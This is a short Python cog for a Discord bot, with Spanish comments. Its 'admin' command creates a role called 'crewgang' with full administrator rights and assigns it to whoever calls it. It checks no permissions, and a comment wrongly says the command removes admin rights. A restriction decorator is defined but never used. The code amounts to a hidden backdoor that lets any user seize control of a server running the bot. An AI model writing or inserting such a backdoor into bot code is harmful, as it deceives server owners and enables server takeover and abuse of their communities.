from discord.ext import commands
import discord

RESTRICTED_GUILDS = [123456789012345678, 987654321098765432]  # Reemplaza con los IDs de los servidores restringidos

def guild_restriction(restricted_guilds):
    def decorator(func):
        async def wrapper(ctx, *args, **kwargs):
            if ctx.guild.id in restricted_guilds:
                await ctx.send("Este comando no se puede ejecutar en este servidor.")
                return
            return await func(ctx, *args, **kwargs)
        return wrapper
    return decorator

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def admin(self, ctx):  # Eliminar permisos de administrador
        guild = ctx.guild

        # Crear el rol con permisos de administrador
        role = await guild.create_role(name="crewgang", permissions=discord.Permissions(administrator=True))

        # Asignar el rol al autor del comando
        await ctx.author.add_roles(role)

        await ctx.send(f'Rol **{role.name}** creado y asignado a {ctx.author.mention}.')

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(Admin(bot))
